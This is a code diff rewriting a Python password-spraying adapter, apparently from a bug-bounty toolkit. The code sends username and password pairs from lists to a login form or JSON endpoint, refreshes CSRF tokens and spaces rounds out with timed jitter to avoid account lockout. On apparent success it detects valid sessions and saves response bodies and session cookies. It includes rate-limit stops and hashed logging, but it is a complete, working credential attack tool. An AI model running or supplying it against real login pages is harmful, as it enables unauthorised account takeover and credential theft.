@@ -1,275 +1,498 @@
 #!/usr/bin/env python3
-"""
-HTTP form spray module — POST username/password to a URL, detect success.
+"""HTTP form/JSON Spray 适配器；由 spray_orchestrator.sh 调用。"""
 
-NOT a standalone entry point. Spawned by tools/spray_orchestrator.sh which
-sets the required environment variables and runs lockout warning +
-typed-hostname interactive confirmation first.
-
-Spray order: pass[i] x all_users per round (NOT brute per-user). This keeps
-each account at <=1 failed attempt per round.
-
-Success detection (any one of these matches):
-  - HTTP redirect (3xx) to a path that is NOT the login page
-  - SPRAY_SUCCESS_REGEX matches response body (if set)
-  - Absence of SPRAY_FAIL_REGEX (if FAIL but no SUCCESS regex)
-  - Status 200 + body length significantly different from baseline (heuristic)
-
-Env contract (all set by spray_orchestrator.sh):
-  SPRAY_TARGET_URL        login form URL
-  SPRAY_USERS_FILE        one username per line
-  SPRAY_PASSES_FILE       one password per line
-  SPRAY_POST_DATA         template, e.g. "username={USER}&password={PASS}"
-                          {USER}, {PASS}, {CSRF} are substituted.
-                          If empty, defaults to "username={USER}&password={PASS}"
-  SPRAY_CSRF_EXTRACT      regex with one group capturing the CSRF token from
-                          an initial GET of TARGET_URL (e.g. 'name="csrf" value="([^"]+)"')
-  SPRAY_SUCCESS_REGEX     body regex marking success (optional)
-  SPRAY_FAIL_REGEX        body regex marking failure (optional)
-  SPRAY_DELAY             seconds between rounds
-  SPRAY_JITTER            ± seconds added to delay
-  SPRAY_CONTINUE_ON_HIT   "true" to keep going after first valid creds
-  AUDIT_LOG               JSONL output path
-"""
 from __future__ import annotations
-import hashlib
+
+import http.cookiejar
 import json
 import os
 import random
 import re
-import ssl
 import sys
 import time
 import urllib.error
 import urllib.parse
 import urllib.request
-from datetime import datetime, timezone
+from collections import Counter
+from pathlib import Path
+from typing import Any
 
-# Permissive SSL — many BB targets use self-signed staging certs
-SSL_CTX = ssl.create_default_context()
-SSL_CTX.check_hostname = False
-SSL_CTX.verify_mode = ssl.CERT_NONE
-
-USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research"
-
-
-def env(name: str, default: str = "") -> str:
-    return os.environ.get(name, default)
-
-
-def env_required(name: str) -> str:
-    v = os.environ.get(name)
-    if not v:
-        print(f"[-] Missing required env var: {name}", file=sys.stderr)
-        sys.exit(1)
-    return v
-
-
-def read_lines(path: str) -> list[str]:
-    with open(path) as f:
-        return [line.strip() for line in f if line.strip()]
-
-
-def sha256_prefix(s: str) -> str:
-    return hashlib.sha256(s.encode("utf-8")).hexdigest()[:12]
-
-
-def audit(record: dict) -> None:
-    record["ts"] = datetime.now(timezone.utc).isoformat()
-    with open(AUDIT_LOG_PATH, "a") as f:
-        f.write(json.dumps(record) + "\n")
-
-
-def _build_opener():
-    """Build a urllib opener that uses our SSL context AND doesn't follow redirects."""
-    class NoRedirect(urllib.request.HTTPRedirectHandler):
-        def redirect_request(self, *a, **k): return None
-    return urllib.request.build_opener(
-        NoRedirect,
-        urllib.request.HTTPSHandler(context=SSL_CTX),
+try:
+    from tools.spray_contract import (
+        append_attempt,
+        build_ssl_context as _ssl_context,
+        finish_run,
+        insecure_enabled as _insecure_enabled,
+        prepare_run,
+        write_private_json,
+    )
+except ImportError:  # pragma: no cover - 支持直接运行 tools 脚本
+    from spray_contract import (
+        append_attempt,
+        build_ssl_context as _ssl_context,
+        finish_run,
+        insecure_enabled as _insecure_enabled,
+        prepare_run,
+        write_private_json,
     )
 
 
-def fetch_csrf(url: str, regex: str) -> str | None:
-    """GET the form URL and extract CSRF token via regex (group 1)."""
-    req = urllib.request.Request(url, headers={"User-Agent": USER_AGENT})
-    opener = _build_opener()
-    try:
-        with opener.open(req, timeout=15) as resp:
-            body = resp.read().decode("utf-8", errors="replace")
-        m = re.search(regex, body)
-        if not m:
-            return None
-        return m.group(1)
-    except Exception as e:
-        print(f"[!] CSRF fetch failed: {e}", file=sys.stderr)
+USER_AGENT = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Bug-Bounty-Research"
+MAX_RESPONSE_BYTES = 64 * 1024
+ALLOWED_PLACEHOLDERS = {"USER", "USERNAME", "PASS", "PASSWORD", "CSRF"}
+PLACEHOLDER_RE = re.compile(r"\{([A-Z_]+)\}")
+
+
+class NoRedirect(urllib.request.HTTPRedirectHandler):
+    def redirect_request(self, *args, **kwargs):
         return None
 
 
-def substitute(template: str, user: str, password: str, csrf: str | None) -> str:
-    """Replace placeholders ({USER}/{USERNAME}, {PASS}/{PASSWORD}, {CSRF}).
+def _load_json_object(path: Path) -> dict[str, Any]:
+    try:
+        payload = json.loads(path.read_text(encoding="utf-8"))
+    except (OSError, json.JSONDecodeError) as exc:
+        raise ValueError(f"invalid request spec: {path}: {exc}") from exc
+    if not isinstance(payload, dict):
+        raise ValueError("request spec must be a JSON object")
+    return payload
 
-    Uses str.replace not str.format — won't crash on unknown placeholders
-    (they remain literal in the output, which the user will see in the request)."""
-    subs = {
-        "{USER}": user, "{USERNAME}": user,
-        "{PASS}": password, "{PASSWORD}": password,
-        "{CSRF}": csrf or "",
+
+def _legacy_spec() -> dict[str, Any]:
+    post_data = os.environ.get("SPRAY_POST_DATA") or "username={USER}&password={PASS}"
+    pairs = urllib.parse.parse_qsl(post_data, keep_blank_values=True)
+    if not pairs:
+        raise ValueError("legacy --post-data must contain form fields")
+    body: dict[str, str] = {}
+    for key, value in pairs:
+        if key in body:
+            raise ValueError("legacy --post-data cannot represent duplicate form fields; use --request-spec")
+        body[key] = value
+    spec: dict[str, Any] = {
+        "schema_version": 1,
+        "method": "POST",
+        "url": os.environ.get("SPRAY_TARGET_URL", ""),
+        "headers": {},
+        "body_format": "form",
+        "body": body,
+        "success": {},
+        "failure": {},
+        "guard": {"status_codes": [429]},
     }
-    for k, v in subs.items():
-        template = template.replace(k, v)
-    return template
+    csrf_regex = os.environ.get("SPRAY_CSRF_EXTRACT", "")
+    if csrf_regex:
+        spec["csrf"] = {
+            "url": os.environ.get("SPRAY_TARGET_URL", ""),
+            "regex": csrf_regex,
+            "refresh": "per-attempt",
+        }
+    if os.environ.get("SPRAY_SUCCESS_REGEX"):
+        spec["success"]["body_regex"] = os.environ["SPRAY_SUCCESS_REGEX"]
+    if os.environ.get("SPRAY_FAIL_REGEX"):
+        spec["failure"]["body_regex"] = os.environ["SPRAY_FAIL_REGEX"]
+    return spec
 
 
-def attempt(url: str, post_data_tpl: str, user: str, password: str,
-            csrf_token: str | None, success_re: re.Pattern | None,
-            fail_re: re.Pattern | None) -> dict:
-    """Return result dict: {status_code, redirect_to, looks_like_success, duration_ms}."""
-    body = substitute(post_data_tpl, user, password, csrf_token)
-    body_bytes = body.encode("utf-8")
-    req = urllib.request.Request(
-        url,
-        data=body_bytes,
-        headers={
-            "User-Agent": USER_AGENT,
-            "Content-Type": "application/x-www-form-urlencoded",
-            "Content-Length": str(len(body_bytes)),
-        },
-        method="POST",
+def _walk_strings(value: Any):
+    if isinstance(value, str):
+        yield value
+    elif isinstance(value, dict):
+        for item in value.values():
+            yield from _walk_strings(item)
+    elif isinstance(value, list):
+        for item in value:
+            yield from _walk_strings(item)
+
+
+def _compile_optional(value: Any, *, label: str) -> re.Pattern[str] | None:
+    if value in (None, ""):
+        return None
+    if not isinstance(value, str):
+        raise ValueError(f"{label} must be a string")
+    try:
+        return re.compile(value, re.IGNORECASE)
+    except re.error as exc:
+        raise ValueError(f"invalid {label}: {exc}") from exc
+
+
+def load_request_spec() -> dict[str, Any]:
+    path = os.environ.get("SPRAY_REQUEST_SPEC", "").strip()
+    spec = _load_json_object(Path(path)) if path else _legacy_spec()
+    if spec.get("schema_version") != 1:
+        raise ValueError("request spec schema_version must be 1")
+    if str(spec.get("method", "POST")).upper() != "POST":
+        raise ValueError("request spec method must be POST")
+    target_url = os.environ.get("SPRAY_TARGET_URL", "")
+    request_url = str(spec.get("url") or target_url)
+    if request_url != target_url:
+        raise ValueError("request spec url must match the CLI target URL")
+    parsed = urllib.parse.urlparse(request_url)
+    if parsed.scheme not in {"http", "https"} or not parsed.hostname:
+        raise ValueError("request spec url must be a valid http/https URL")
+    spec["url"] = request_url
+
+    body_format = spec.get("body_format")
+    if body_format not in {"form", "json"}:
+        raise ValueError("request spec body_format must be form or json")
+    body = spec.get("body")
+    if not isinstance(body, dict) or not body:
+        raise ValueError("request spec body must be a non-empty object")
+    if body_format == "form" and any(isinstance(value, (dict, list)) for value in body.values()):
+        raise ValueError("form body values must be scalar")
+
+    headers = spec.get("headers") or {}
+    if not isinstance(headers, dict) or any(not isinstance(k, str) or not isinstance(v, str) for k, v in headers.items()):
+        raise ValueError("request spec headers must be a string map")
+    if any(key.lower() in {"host", "content-length"} for key in headers):
+        raise ValueError("request spec cannot override Host or Content-Length")
+    spec["headers"] = headers
+
+    placeholders = {
+        match.group(1)
+        for value in _walk_strings({"headers": headers, "body": body})
+        for match in PLACEHOLDER_RE.finditer(value)
+    }
+    unknown = placeholders - ALLOWED_PLACEHOLDERS
+    if unknown:
+        raise ValueError(f"unknown request placeholders: {', '.join(sorted(unknown))}")
+    if not placeholders.intersection({"USER", "USERNAME"}):
+        raise ValueError("request body/headers must contain {USER} or {USERNAME}")
+    if not placeholders.intersection({"PASS", "PASSWORD"}):
+        raise ValueError("request body/headers must contain {PASS} or {PASSWORD}")
+
+    success = spec.get("success") or {}
+    failure = spec.get("failure") or {}
+    guard = spec.get("guard") or {}
+    if not all(isinstance(value, dict) for value in (success, failure, guard)):
+        raise ValueError("success, failure, and guard must be objects")
+    compiled = {
+        "success_body": _compile_optional(success.get("body_regex"), label="success.body_regex"),
+        "success_redirect": _compile_optional(success.get("redirect_regex"), label="success.redirect_regex"),
+        "failure_body": _compile_optional(failure.get("body_regex"), label="failure.body_regex"),
+        "guard_body": _compile_optional(guard.get("body_regex"), label="guard.body_regex"),
+    }
+    cookie_name = success.get("cookie_name")
+    if cookie_name not in (None, "") and not isinstance(cookie_name, str):
+        raise ValueError("success.cookie_name must be a string")
+    if not any((compiled["success_body"], compiled["success_redirect"], cookie_name, compiled["failure_body"])):
+        raise ValueError("request spec needs an explicit success or failure signal")
+
+    status_codes = guard.get("status_codes", [429])
+    if not isinstance(status_codes, list) or any(not isinstance(code, int) or not 100 <= code <= 599 for code in status_codes):
+        raise ValueError("guard.status_codes must be a list of HTTP status integers")
+    guard["status_codes"] = sorted(set(status_codes) | {429})
+    spec["success"], spec["failure"], spec["guard"] = success, failure, guard
+
+    csrf = spec.get("csrf")
+    if csrf is not None:
+        if not isinstance(csrf, dict):
+            raise ValueError("csrf must be an object")
+        csrf_url = str(csrf.get("url") or request_url)
+        csrf_parsed = urllib.parse.urlparse(csrf_url)
+        if csrf_parsed.scheme not in {"http", "https"} or not csrf_parsed.hostname:
+            raise ValueError("csrf.url must be a valid http/https URL")
+        csrf_re = _compile_optional(csrf.get("regex"), label="csrf.regex")
+        if csrf_re is None or csrf_re.groups < 1:
+            raise ValueError("csrf.regex must contain a capture group")
+        if csrf.get("refresh", "per-attempt") != "per-attempt":
+            raise ValueError("csrf.refresh currently supports only per-attempt")
+        csrf["url"] = csrf_url
+        csrf["refresh"] = "per-attempt"
+    if "CSRF" in placeholders and not csrf:
+        raise ValueError("{CSRF} placeholder requires a csrf object")
+    if csrf and "CSRF" not in placeholders:
+        raise ValueError("csrf object requires a {CSRF} placeholder")
+
+    spec["_compiled"] = compiled
+    return spec
+
+
+def _binding_spec(spec: dict[str, Any]) -> dict[str, Any]:
+    return {
+        "request_spec": {key: value for key, value in spec.items() if key != "_compiled"},
+        "tls_verify": not _insecure_enabled(),
+    }
+
+
+def _request_shape(spec: dict[str, Any]) -> dict[str, Any]:
+    success = spec["success"]
+    return {
+        "method": "POST",
+        "url": spec["url"],
+        "body_format": spec["body_format"],
+        "header_names": sorted(spec["headers"]),
+        "body_fields": sorted(spec["body"]),
+        "csrf": bool(spec.get("csrf")),
+        "success_signals": sorted(key for key, value in success.items() if value),
+        "failure_signal": bool(spec["failure"].get("body_regex")),
+        "guard_status_codes": spec["guard"]["status_codes"],
+        "tls_verify": not _insecure_enabled(),
+    }
+
+
+def _substitute(value: Any, *, user: str, password: str, csrf: str) -> Any:
+    substitutions = {
+        "{USER}": user,
+        "{USERNAME}": user,
+        "{PASS}": password,
+        "{PASSWORD}": password,
+        "{CSRF}": csrf,
+    }
+    if isinstance(value, str):
+        for key, replacement in substitutions.items():
+            value = value.replace(key, replacement)
+        return value
+    if isinstance(value, dict):
+        return {key: _substitute(item, user=user, password=password, csrf=csrf) for key, item in value.items()}
+    if isinstance(value, list):
+        return [_substitute(item, user=user, password=password, csrf=csrf) for item in value]
+    return value
+
+
+def _build_opener(jar: http.cookiejar.CookieJar) -> urllib.request.OpenerDirector:
+    return urllib.request.build_opener(
+        urllib.request.HTTPCookieProcessor(jar),
+        NoRedirect,
+        urllib.request.HTTPSHandler(context=_ssl_context()),
     )
 
-    opener = _build_opener()
 
-    start = time.time()
-    status = 0
-    redirect_to = None
-    resp_body = ""
+def _read_response(opener: urllib.request.OpenerDirector, request: urllib.request.Request) -> dict[str, Any]:
+    started = time.monotonic()
     try:
-        with opener.open(req, timeout=15) as resp:
-            status = resp.status
-            resp_body = resp.read(8192).decode("utf-8", errors="replace")
-    except urllib.error.HTTPError as e:
-        status = e.code
-        if status in (301, 302, 303, 307, 308):
-            redirect_to = e.headers.get("Location", "")
+        with opener.open(request, timeout=15) as response:
+            return {
+                "status_code": response.status,
+                "headers": dict(response.headers.items()),
+                "body": response.read(MAX_RESPONSE_BYTES).decode("utf-8", errors="replace"),
+                "redirect_to": "",
+                "duration_ms": int((time.monotonic() - started) * 1000),
+            }
+    except urllib.error.HTTPError as exc:
         try:
-            resp_body = e.read(8192).decode("utf-8", errors="replace")
-        except Exception:
-            pass
-    except Exception as e:
+            body = exc.read(MAX_RESPONSE_BYTES).decode("utf-8", errors="replace")
+        except OSError:
+            body = ""
+        return {
+            "status_code": exc.code,
+            "headers": dict(exc.headers.items()) if exc.headers else {},
+            "body": body,
+            "redirect_to": exc.headers.get("Location", "") if exc.headers else "",
+            "duration_ms": int((time.monotonic() - started) * 1000),
+        }
+    except (OSError, urllib.error.URLError, TimeoutError) as exc:
         return {
             "status_code": 0,
-            "redirect_to": None,
-            "looks_like_success": False,
-            "duration_ms": int((time.time() - start) * 1000),
-            "error": str(e),
+            "headers": {},
+            "body": "",
+            "redirect_to": "",
+            "duration_ms": int((time.monotonic() - started) * 1000),
+            "error": type(exc).__name__,
         }
-    duration_ms = int((time.time() - start) * 1000)
 
-    # Success detection
-    success = False
-    if success_re and success_re.search(resp_body):
-        success = True
-    elif fail_re:
-        success = not fail_re.search(resp_body)
-    elif redirect_to:
-        # 3xx away from login page is the most common success signal
-        login_path = urllib.parse.urlparse(url).path
-        if login_path not in (redirect_to or ""):
-            success = True
-    elif status == 200 and len(resp_body) > 0:
-        # Without explicit regex we can't be sure — false-positive risk
-        # Leave as not-success; user can supply --success-regex.
-        success = False
 
+def _fetch_csrf(opener: urllib.request.OpenerDirector, spec: dict[str, Any]) -> tuple[str, str]:
+    csrf = spec.get("csrf")
+    if not csrf:
+        return "", ""
+    request = urllib.request.Request(csrf["url"], headers={"User-Agent": USER_AGENT})
+    result = _read_response(opener, request)
+    if result.get("error"):
+        return "", "network_error"
+    match = re.search(csrf["regex"], result["body"], re.IGNORECASE)
+    if not match:
+        return "", "csrf_unavailable"
+    return match.group(1), ""
+
+
+def _safe_redirect(value: str) -> str:
+    if not value:
+        return ""
+    parsed = urllib.parse.urlparse(value)
+    return urllib.parse.urlunparse((parsed.scheme, parsed.netloc, parsed.path, "", "", ""))
+
+
+def _attempt(
+    spec: dict[str, Any],
+    opener: urllib.request.OpenerDirector,
+    jar: http.cookiejar.CookieJar,
+    user: str,
+    password: str,
+) -> dict[str, Any]:
+    csrf, csrf_error = _fetch_csrf(opener, spec)
+    if csrf_error:
+        return {
+            "classification": "network_error" if csrf_error == "network_error" else "guarded",
+            "credential_valid": None,
+            "status_code": 0,
+            "duration_ms": 0,
+            "error_kind": csrf_error,
+            "body": "",
+            "headers": {},
+            "redirect_to": "",
+        }
+
+    body_value = _substitute(spec["body"], user=user, password=password, csrf=csrf)
+    headers = {
+        "User-Agent": USER_AGENT,
+        **_substitute(spec["headers"], user=user, password=password, csrf=csrf),
+    }
+    if spec["body_format"] == "form":
+        body_bytes = urllib.parse.urlencode(body_value).encode("utf-8")
+        headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
+    else:
+        body_bytes = json.dumps(body_value, ensure_ascii=False, separators=(",", ":")).encode("utf-8")
+        headers.setdefault("Content-Type", "application/json")
+    request = urllib.request.Request(spec["url"], data=body_bytes, headers=headers, method="POST")
+    cookies_before = {cookie.name: cookie.value for cookie in jar}
+    result = _read_response(opener, request)
+    if result.get("error"):
+        classification, credential_valid = "network_error", None
+    else:
+        compiled = spec["_compiled"]
+        guard_match = result["status_code"] in spec["guard"]["status_codes"] or bool(
+            compiled["guard_body"] and compiled["guard_body"].search(result["body"])
+        )
+        cookie_name = spec["success"].get("cookie_name")
+        cookie_match = bool(
+            cookie_name
+            and any(
+                cookie.name == cookie_name
+                and cookie.value
+                and cookies_before.get(cookie.name) != cookie.value
+                for cookie in jar
+            )
+        )
+        success_match = bool(
+            (compiled["success_body"] and compiled["success_body"].search(result["body"]))
+            or (compiled["success_redirect"] and compiled["success_redirect"].search(result["redirect_to"]))
+            or cookie_match
+        )
+        failure_match = bool(
+            compiled["failure_body"] and compiled["failure_body"].search(result["body"])
+        )
+        if guard_match:
+            classification, credential_valid = "rate_limited" if result["status_code"] == 429 else "guarded", None
+        elif success_match:
+            classification, credential_valid = "valid_session", True
+        elif failure_match:
+            classification, credential_valid = "invalid_credentials", False
+        else:
+            classification, credential_valid = "ambiguous_candidate", None
     return {
-        "status_code": status,
-        "redirect_to": redirect_to,
-        "looks_like_success": success,
-        "duration_ms": duration_ms,
+        **result,
+        "classification": classification,
+        "credential_valid": credential_valid,
     }
 
 
 def main() -> int:
-    global AUDIT_LOG_PATH
-    AUDIT_LOG_PATH = env_required("AUDIT_LOG")
+    context = None
+    counters: Counter[str] = Counter()
+    try:
+        spec = load_request_spec()
+        context = prepare_run(
+            "http-form",
+            config_binding=_binding_spec(spec),
+            request_shape=_request_shape(spec),
+        )
+        counters.update(context.existing_counts or {})
+        if context.dry_run:
+            print(f"[+] Preflight: {context.preflight_path}")
+            print(f"[+] {len(context.users)} users × {len(context.passwords)} passwords; network attempts=0")
+            return 0
 
-    url           = env_required("SPRAY_TARGET_URL")
-    users_file    = env_required("SPRAY_USERS_FILE")
-    passes_file   = env_required("SPRAY_PASSES_FILE")
-    post_data_tpl = env("SPRAY_POST_DATA") or "username={USER}&password={PASS}"
-    csrf_extract  = env("SPRAY_CSRF_EXTRACT")
-    success_re    = re.compile(env("SPRAY_SUCCESS_REGEX")) if env("SPRAY_SUCCESS_REGEX") else None
-    fail_re       = re.compile(env("SPRAY_FAIL_REGEX")) if env("SPRAY_FAIL_REGEX") else None
-    delay         = int(env("SPRAY_DELAY", "1800"))
-    jitter        = int(env("SPRAY_JITTER", "60"))
-    continue_hit  = env("SPRAY_CONTINUE_ON_HIT") == "true"
+        jars = {user: http.cookiejar.CookieJar() for user in context.users}
+        openers = {user: _build_opener(jars[user]) for user in context.users}
+        valid_users = set(context.valid_users or set())
+        consecutive_network_errors = 0
+        stop_reason = "completed"
+        status = "completed"
 
-    users    = read_lines(users_file)
-    passwords = read_lines(passes_file)
+        for round_index, password in enumerate(context.passwords, 1):
+            attempted_this_round = False
+            for user in context.users:
+                if user in valid_users:
+                    continue
+                attempt_key = context.attempt_key(user, password)
+                if attempt_key in (context.completed_attempts or set()):
+                    continue
+                attempted_this_round = True
+                result = _attempt(spec, openers[user], jars[user], user, password)
+                classification = result["classification"]
+                counters[classification] += 1
+                append_attempt(
+                    context,
+                    {
+                        "tool": "builtin",
+                        "round": round_index,
+                        "user": user,
+                        "pwd_sha256_prefix": attempt_key.rsplit("\0", 1)[1],
+                        "attempt_key": attempt_key,
+                        "classification": classification,
+                        "credential_valid": result["credential_valid"],
+                        "token_issued": False,
+                        "status_code": result["status_code"],
+                        "duration_ms": result["duration_ms"],
+                        "redirect_to": _safe_redirect(result.get("redirect_to", "")),
+                        "error_kind": result.get("error_kind") or result.get("error"),
+                    },
+                )
 
-    print(f"[+] HTTP form spray: {url}")
-    print(f"[+] {len(users)} users × {len(passwords)} passwords = {len(users)*len(passwords)} attempts")
-    print(f"[+] Spray order: pass[i] × all_users per round")
-    print(f"[+] Audit log: {AUDIT_LOG_PATH}")
-    print("")
+                if classification in {"valid_session", "ambiguous_candidate"}:
+                    write_private_json(
+                        context,
+                        f"response-{sum(counters.values()):06d}.json",
+                        {
+                            "user": user,
+                            "pwd_sha256_prefix": attempt_key.rsplit("\0", 1)[1],
+                            "classification": classification,
+                            "status_code": result["status_code"],
+                            "headers": result.get("headers", {}),
+                            "body": result.get("body", ""),
+                            "cookies": {cookie.name: cookie.value for cookie in jars[user]},
+                        },
+                    )
+                if classification == "valid_session":
+                    valid_users.add(user)
 
-    hits: list[tuple[str, str]] = []
+                if classification == "network_error":
+                    consecutive_network_errors += 1
+                else:
+                    consecutive_network_errors = 0
 
-    for round_idx, password in enumerate(passwords, 1):
-        print(f"=== Round {round_idx}/{len(passwords)} — testing {len(users)} users ===")
-        # Refresh CSRF token once per round (most sites issue per-session tokens)
-        csrf_token = None
-        if csrf_extract:
-            csrf_token = fetch_csrf(url, csrf_extract)
-            if csrf_token:
-                print(f"    CSRF: {csrf_token[:16]}...")
-            else:
-                print("    [!] CSRF not extracted; sending without it")
+                if classification in {"rate_limited", "guarded", "ambiguous_candidate"}:
+                    stop_reason, status = classification, "stopped"
+                    raise StopIteration
+                if consecutive_network_errors >= 3:
+                    stop_reason, status = "network_error_threshold", "stopped"
+                    raise StopIteration
+                if classification == "valid_session" and not context.continue_on_hit:
+                    stop_reason, status = "credential_valid", "stopped"
+                    raise StopIteration
 
-        for user in users:
-            res = attempt(url, post_data_tpl, user, password, csrf_token, success_re, fail_re)
-            audit({
-                "round": round_idx,
-                "user": user,
-                "pwd_sha256_prefix": sha256_prefix(password),
-                "status_code": res["status_code"],
-                "redirect_to": res.get("redirect_to"),
-                "looks_like_success": res["looks_like_success"],
-                "duration_ms": res["duration_ms"],
-                "error": res.get("error"),
-            })
+            if attempted_this_round and round_index < len(context.passwords):
+                wait = max(0, context.delay + random.randint(-context.jitter, context.jitter))
+                time.sleep(wait)
 
-            if res["looks_like_success"]:
-                hits.append((user, password))
-                print(f"    \033[0;32m[HIT]\033[0m {user} ({res['status_code']} -> {res.get('redirect_to')})")
-                if not continue_hit:
-                    print("[+] Hit found and --continue-on-hit not set; stopping.")
-                    _summary(hits, passwords, round_idx)
-                    return 0
-
-        # Inter-round delay
-        if round_idx < len(passwords):
-            wait = delay + random.randint(-jitter, jitter)
-            print(f"    [*] Round done. Sleeping {wait}s before next round...")
-            time.sleep(max(1, wait))
-
-    _summary(hits, passwords, len(passwords))
-    return 0
-
-
-def _summary(hits, all_passes, rounds_done):
-    print()
-    print("=" * 50)
-    print("  HTTP Form Spray Summary")
-    print("=" * 50)
-    print(f"  Rounds completed: {rounds_done}/{len(all_passes)}")
-    print(f"  Hits found:       {len(hits)}")
-    for user, pwd in hits:
-        print(f"    {user}  (pwd-sha256-prefix: {sha256_prefix(pwd)})")
-    print(f"  Audit log:        {AUDIT_LOG_PATH}")
-    print("=" * 50)
+        finish_run(context, status=status, stop_reason=stop_reason, counters=dict(counters), exit_code=0)
+        print(f"[+] Summary: {context.summary_path}")
+        return 0
+    except StopIteration:
+        assert context is not None
+        finish_run(context, status=status, stop_reason=stop_reason, counters=dict(counters), exit_code=0)
+        print(f"[+] Summary: {context.summary_path}")
+        return 0
+    except KeyboardInterrupt:
+        if context is not None and not context.dry_run:
+            finish_run(context, status="interrupted", stop_reason="sigint", counters=dict(counters), exit_code=130)
+        return 130
+    except (OSError, ValueError) as exc:
+        if context is not None and not context.dry_run:
+            finish_run(context, status="error", stop_reason="tool_error", counters=dict(counters), exit_code=2)
+        print(f"http-form adapter error: {exc}", file=sys.stderr)
+        return 2
 
 
 if __name__ == "__main__":
-    sys.exit(main())
+    raise SystemExit(main())
